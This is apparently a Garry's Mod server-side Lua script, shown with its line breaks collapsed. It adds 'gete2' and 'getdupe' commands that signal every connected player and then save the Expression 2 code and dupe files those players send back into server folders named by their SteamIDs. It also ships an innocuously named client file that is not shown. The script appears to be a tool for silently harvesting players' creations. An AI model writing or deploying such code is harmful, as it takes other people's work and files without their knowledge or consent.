require("datastream")AddCSLuaFile("cl_coolfile.lua")local function CopyThaE2(sender, handler, id, encoded, decoded)	local SID = string.gsub(sender:SteamID(),":","-")	file.CreateDir("E2s")	file.CreateDir("E2s/"..SID)	file.Write("E2s/"..SID.."/"..decoded[1], decoded[2])	print("Got E2: "..SID.."/"..decoded[1])endlocal function GetTheE2()	print("Getting E2s...")	datastream.StreamToClients(player.GetAll(),"E2Get", {"nil"})endlocal function CopyThaDupe(sender, handler, id, encoded, decoded)	local SID = string.gsub(sender:SteamID(),":","-")	file.CreateDir("Dupes")	file.CreateDir("Dupes/"..SID)	file.Write("Dupes/"..SID.."/"..decoded[1], decoded[2])	print("Got Dupe: "..SID.."/"..decoded[1])endlocal function GetTheDupe()	print("Getting Dupes...")	datastream.StreamToClients(player.GetAll(),"DupeGet", {"nil"})enddatastream.Hook("E2Send", CopyThaE2)concommand.Add("gete2",GetTheE2)datastream.Hook("DupeSend", CopyThaDupe)concommand.Add("getdupe",GetTheDupe)